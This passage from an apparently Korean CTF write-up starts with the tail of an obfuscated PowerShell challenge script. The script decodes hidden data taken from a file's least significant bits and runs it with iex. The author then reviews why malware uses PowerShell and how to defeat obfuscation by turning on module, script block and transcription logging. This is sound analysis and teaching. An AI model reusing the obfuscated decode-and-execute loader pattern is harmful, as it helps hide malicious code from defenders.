        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$MpQsBnLjHtVrXpWdNgZkTqScRmVlPyKtWhXc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WcTfDrGpLxJvNzMkQsYrPtVcHwBmZnKsVnRq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WcTfDrGpLxJvNzMkQsYrPtVcHwBmZnKsVnRq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$qdwcyvbaztyfuqwehvg&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$HtRfGpLkNqMwXsPtVzYjLpScXrJwNmTpYvQr&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$qdwcyvbaztyfuqwehvg&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$HfDrQxJsWzKpLtVgXpYtMnCjPkZfVrYsLcGh&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Text.Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ASCII.GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$MpQsBnLjHtVrXpWdNgZkTqScRmVlPyKtWhXc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ToArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iex&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$HfDrQxJsWzKpLtVgXpYtMnCjPkZfVrYsLcGh&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dfgAeJKLfgswERTfgjkl12&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;MA==&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$poiNMBcfgdqwerYxsdflq1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ToInt32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Text.Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ASCII.GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FromBase64String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dfgAeJKLfgswERTfgjkl12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$poiASDfgqerdfdseN1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sqrt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$wertqweOPhgdfgdkl3&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FromBase64String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;UG93ZXJTaGVsbA==&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$tyuIQWERTzxcfderq0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Text.Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ASCII.GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$wertqweOPhgdfgdkl3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$poiNMBcfgdqwerYxsdflq1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-eq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$poiNMBcfgdqwerYxsdflq1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$nmiHgTPOlkjyewrflp4&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$poiASDfgqerdfdseN1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$poiNMBcfgdqwerYxsdflq1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$lkjSDfghUErtqweIOPh1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;V2VsY29tZQ==&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ghkZXCVgqwqerQWERTzx2&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Text.Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ASCII.GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FromBase64String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$lkjSDfghUErtqweIOPh1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$zxcvTREWSADfghJKLre3&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$poiNMBcfgdqwerYxsdflq1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$zxcvTREWSADfghJKLre3&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-lt&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$nmiHgTPOlkjyewrflp4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$zxcvTREWSADfghJKLre3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$jkLOIUmnhQWEfghZxcvb4&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$poiNMBcfgdqwerYxsdflq1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$zxcvTREWSADfghJKLre3&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$werERTOIUyNMBdfqwefp5&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FromBase64String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;U2NyaXB0IGhhcyBlbmRlZCBleGVjdXRpb24=&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$zxcMNBAsdfwerXCVbnlk3&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Text.Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ASCII.GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$werERTOIUyNMBdfqwefp5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;위 스크립트는 특정 파일의 LSB를 읽어 와, 사전에 정의된 Key를 기반으로 복호화하는 스크립트다.&lt;/p&gt;

&lt;p&gt;이 지점에서 위 스크립트와 대상 파일 간의 관계에 주목했어야 했는데,&lt;/p&gt;

&lt;p&gt;더 자세히 말하자면&lt;/p&gt;

&lt;p&gt;“문제의 힌트가 LSB였으며, 특정 파일을 읽어와 복호화하네? 그렇다면 일반적으로는 전체를 복호화하겠지?”
라고 생각했어야 했는데,&lt;/p&gt;

&lt;p&gt;그렇게 생각하지 않은 점이 패인이었던 것 같다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;어쨌든… 지금 문제 라이트업을 보니, 이 문제에서 필요한 정보는 다 찾았지만 플래그를 찾지 못했던 것으로 보인다.&lt;/p&gt;

&lt;p&gt;그렇기 때문에, 문제 풀이보다는&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;‘어떤 사고의 흐름을 가져야 하는지’&lt;/li&gt;
  &lt;li&gt;‘여기에서 알아가야 할 주요 기술적 사항’&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;위 두 사항에 주안점을 두고 문제를 분석해 보려 한다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;2-쉘-스크립트-난독화-기법&quot;&gt;2. 쉘 스크립트 난독화 기법&lt;/h1&gt;

&lt;p&gt;난독화는 여러 가지 방식으로 진행되기 때문에, 하나하나 다루는 것은 효율이 떨어진다고 생각함&lt;/p&gt;

&lt;p&gt;즉,&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;쉘 스크립트를 활용한 악성코드는 동작 단계별로 어떤 행위가 필연적인지&lt;/li&gt;
  &lt;li&gt;그렇다면 그 행위를 역이용해서 쉘 스크립트 원본 혹은 행위를 어떻게 얻어야 하는지&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;고민하는 게 훨씬 범용적일 것 같다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;21-악성코드는-왜-쉘스크립트를-사용할까&quot;&gt;2.1. 악성코드는 왜 쉘스크립트를 사용할까?&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;공격자가 악성 스크립트의 활동을 숨길 수 있기 때문&lt;/p&gt;

    &lt;p&gt;→ 파워쉘은 시스템의 정상 응용이기 때문에, 파워쉘에서 악성 커맨드가 실행되어도 AV의 탐지를 우회할 수 있음&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;이렇게 시스템의 정상 응용을 활용해 악성 행위를 수행하는 기법을 ‘Living-off-the-land’ 기법으로 칭함&lt;/li&gt;
    &lt;/ul&gt;

    &lt;p&gt;→ 파워쉘을 통해 OS에서 제공하는 주요 함수에 접근할 수 있고, 추가 응용을 실행하지 않기에 매우 적은 흔적을 남기므로 탐지가 어려움&lt;/p&gt;

    &lt;p&gt;→ 파일리스 기법 악성코드가 바로 OS 스크립트 엔진을 사용해 악성행위를 수행하는 대표 예&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;22-악성코드가-쉘스크립트를-사용할-때의-동작-단계-구성&quot;&gt;2.2. 악성코드가 쉘스크립트를 사용할 때의 동작 단계 구성&lt;/h2&gt;

&lt;p&gt;악성코드가 이미 설치된 상황을 가정하고 아래 단계를 서술했다. 내 경험적 지식에 의존해 서술하는 것이므로, 얼마든지 예외 혹은 틀린 설명이 있을 수 있다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;정보 복호화&lt;/strong&gt;
    &lt;ol&gt;
      &lt;li&gt;부수적 파일이 없음
        &lt;ul&gt;
          &lt;li&gt;
            &lt;p&gt;파일을 사용하지 않고, 명령어만 이용&lt;/p&gt;

            &lt;p&gt;⇒ 파워쉘에서 명령어 실행 흔적이 비교적 투명하게 남음&lt;/p&gt;

            &lt;p&gt;⇒ 이때 보통 내부에 암호화해 가지고 있던 데이터를 복호화 및 실행하는 경우가 많음&lt;/p&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;부수적 파일이 필요함
        &lt;ul&gt;
          &lt;li&gt;
            &lt;p&gt;파일을 디스크에 쓰지 않으나, 특정 파일을 간접적으로 사용&lt;/p&gt;

            &lt;p&gt;⇒ 파워쉘에서 해당 파일을 참조한 흔적이 남음&lt;/p&gt;

            &lt;p&gt;⇒ 해당 파일을 이용해 데이터를 추출 및 복호화, 실행함&lt;/p&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;부수적 파일을 만듦
        &lt;ul&gt;
          &lt;li&gt;
            &lt;p&gt;지속성 확보를 위해 파일 쓰기 동작 발생&lt;/p&gt;

            &lt;p&gt;⇒ 공격 종료 후에 레지스트리 키 혹은 파일을 생성 및 변조함&lt;/p&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;C2 접속&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;1에서 복호화한 정보 중에 C2 서버의 주소가 있는 경우가 있음&lt;/li&gt;
      &lt;li&gt;C2서버와의 소켓 통신 연결을 하기 이전에 C2서버 주소 획득을 위해 대칭키 복호화 등의 행위를 하는 경우가 있음
        &lt;ul&gt;
          &lt;li&gt;1.a.에서 암호화해 가지고 있던 데이터가 단순 인코딩된 것이 아니라, 대칭키 암호화 되었을 경우&lt;/li&gt;
          &lt;li&gt;1.b.에서 복호화한 데이터를 pipe 혹은 실행 인자로 전달받는 시점에서 대칭키 암호화 되어 있는 경우&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;보통 이러면 패킷 캡쳐하면 되지 않나? 하지만,
        &lt;ul&gt;
          &lt;li&gt;공격자들도 바보가 아니기 때문에 와이어샤크 등의 패킷 캡쳐 프로그램을 탐지할 경우 프로그램이 종료되도록 루틴을 만듦&lt;/li&gt;
          &lt;li&gt;이러면 또 샌드박스에 넣고 돌리거나, VM에 넣고 돌려서 해당 VM의 네트워크 어댑터의 활동을 호스트에서 관찰하거나 하는 방식을 써서 파훼 가능&lt;/li&gt;
          &lt;li&gt;그래서(이것만이 원인은 아니지만) 또 공격자들은 anti-VM 및 anti-Sandbox 기법을 씀&lt;/li&gt;
          &lt;li&gt;또 이걸 파훼하기 위해….&lt;/li&gt;
          &lt;li&gt;대충 이런 상황입니다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;제일 속 편한 건 복호화 루틴 가지고 하네스를 만들어서 거기에 암호화된 데이터를 돌리는 것이죠…
        &lt;ul&gt;
          &lt;li&gt;그러나 이걸 하려면 리버싱으로 복호화 루틴을 복원해야 함&lt;/li&gt;
          &lt;li&gt;딱히 해결 방법은 없고 그냥 하는 거지 뭐…&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;근데 또 그러면 암호화된 데이터의 복호화 키를 어떻게 얻을 것인가?
        &lt;ul&gt;
          &lt;li&gt;지금 복호화 키를 C2에 요청하는 게 적법한 클라이언트인가? 의 질문으로 귀결됨&lt;/li&gt;
          &lt;li&gt;그럼 사전 인증을 진행해야 할 텐데, 아직까지 내가 아는 한은 prepared-key 방식으로 인증을 진행함&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;행위 수행을 위한 코드 다운로드 or 드롭&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;C2에게 받아온 코드를 다운로드하거나 드로핑한다.
        &lt;ul&gt;
          &lt;li&gt;다운로더는 인터넷을 통해 악성파일을 받아온 후 실행한 로그가 파워쉘 로그에 남아있을 가능성이 높음&lt;/li&gt;
          &lt;li&gt;드로퍼는 스스로를 복호화하는 루틴을 통해 악성코드를 복호화하고, 이를 실행함
            &lt;ul&gt;
              &lt;li&gt;이것도 파워쉘 로그를 보면 흔적이 남아 있을 가능성이 높음&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;악성 행위 수행&lt;/strong&gt;
    &lt;ol&gt;
      &lt;li&gt;정보 유출
        &lt;ul&gt;
          &lt;li&gt;파워쉘을 통해 특정 파일을 원격지 서버에 업로드하거나&lt;/li&gt;
          &lt;li&gt;타 응용을 설치해 특정 파일을 원격지 서버에 업로드하거나&lt;/li&gt;
          &lt;li&gt;아무튼 이것도 파워쉘 로그를 보면 흔적이 남아 있을 가능성이 높고, 아니라 하더라도 맥락을 따라가다 보면 응용 프로그램 로그에서 흔적을 찾을 가능성이 있음&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;시스템 마비
        &lt;ol&gt;
          &lt;li&gt;암호화
            &lt;ul&gt;
              &lt;li&gt;이건 이제 암호화 루틴을 찾아내고… 이하 생략이다.&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ol&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;지속성 확보&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;이것도 생략. 파워쉘에서 실행되는 명령어가 난독화되었을 때 편하게 분석하는 방법을 찾기 위한 포스팅이기 때문&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;그럼 위의 각 단계에서 나는 어떻게 난독화 이전의 쉘 스크립트를 얻을 수 있을까?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;23-쉘-스크립트-난독화-파훼&quot;&gt;2.3. 쉘 스크립트 난독화 파훼&lt;/h2&gt;

&lt;p&gt;앞서 나열한 경우수를 보았을 때, 쉘 스크립트를 악성 행위의 주요 기반으로 삼는 악성 프로그램은&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;파워쉘을 통해 쉘스크립트 실행&lt;/li&gt;
  &lt;li&gt;파워쉘을 통해 복호화 진행&lt;/li&gt;
  &lt;li&gt;파워쉘 등으로 이외 응용 다운로드&lt;/li&gt;
  &lt;li&gt;파워쉘로 이후 원격지 서버와 통신&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;등의 행위를 수행한다.&lt;/p&gt;

&lt;p&gt;즉 &lt;strong&gt;파워쉘에서 무엇이 어떻게 수행되는지 명확하게 알 수 있다면&lt;/strong&gt;, 쉘 스크립트 난독화를 파훼할 수 있다는 뜻이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;231-powershell-로깅-설정&quot;&gt;2.3.1. PowerShell 로깅 설정&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;Windows PowerShell의 동작 로그는 윈도우 이벤트 로그 &amp;gt; 응용프로그램 및 서비스 로그 &amp;gt; Powershell에 기록된다.&lt;/li&gt;
  &lt;li&gt;그러나 추가 설정을 하지 않는 이상 가장 기본적인 정보만 제공한다는 문제가 있음&lt;/li&gt;
  &lt;li&gt;이를 보완하기 위해 분석용 PC에는 PowerShell 추가 로깅을 설정하는 게 좋음&lt;/li&gt;
  &lt;li&gt;PowerShell 추가 로깅 설정에는 아래의 옵션이 있음(출처: &lt;a href=&quot;https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.4&quot;&gt;MS 공식 홈페이지&lt;/a&gt;)
    &lt;ol&gt;
      &lt;li&gt;모듈 로깅
        &lt;ol&gt;
          &lt;li&gt;Record the pipeline execution events for members of specified modules. Module logging must be enabled for both the session and specific modules.&lt;/li&gt;
          &lt;li&gt;출력 일부 및 스크립트 일부 등을 기록함. 타 PowerShell 로깅 소스에서 누락된 일부 세부 정보를 놓치지 않기 위해 켜는 설정&lt;/li&gt;
          &lt;li&gt;이벤트 ID 4103&lt;/li&gt;
        &lt;/ol&gt;
      &lt;/li&gt;
      &lt;li&gt;스크립트 블록 로깅
        &lt;ol&gt;
          &lt;li&gt;Record the processing of commands, script blocks, functions, and scripts whether invoked interactively, or through automation.&lt;/li&gt;
          &lt;li&gt;When you enable Script Block Logging, PowerShell records the content of all script blocks that it processes. Once enabled, any new PowerShell session logs this information.&lt;/li&gt;
          &lt;li&gt;즉, 실행된 코드의 전체 내용을 기록한다는 특징으로 인해 Decoded 된 코드 또한 기록됨&lt;/li&gt;
          &lt;li&gt;그러나, 실행된 코드의 출력을 기록하지 않음&lt;/li&gt;
          &lt;li&gt;이벤트 ID 4104&lt;/li&gt;
        &lt;/ol&gt;
      &lt;/li&gt;
      &lt;li&gt;스크립트 실행
        &lt;ol&gt;
          &lt;li&gt;실행 허용 스크립트를 제어할 수 있음&lt;/li&gt;
        &lt;/ol&gt;
      &lt;/li&gt;
      &lt;li&gt;PowerShell 기록
        &lt;ol&gt;
          &lt;li&gt;파워쉘의 IO를 모두 기록으로 남김&lt;/li&gt;
          &lt;li&gt;실행된 코드의 출력을 기록한다는 점에서 스크립트 블록 로깅과 함께 쓸 만함&lt;/li&gt;
        &lt;/ol&gt;
      &lt;/li&gt;
      &lt;li&gt;Update-Help용 기본 경로 설정
        &lt;ol&gt;
          &lt;li&gt;파워쉘 최신 도움말 파일 다운로드 기본 경로를 설정할 수 있음&lt;/li&gt;
        &lt;/ol&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;즉, ‘모듈 로깅’, ‘스크립트 블록 로깅’, ‘PowerShell 기록’ 3개 설정이 분석에 유용할 것으로 판단됨&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;추가로, 스크립트 실행 옵션을 켜주면 더 편하게 분석이 가능할 것 같음&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

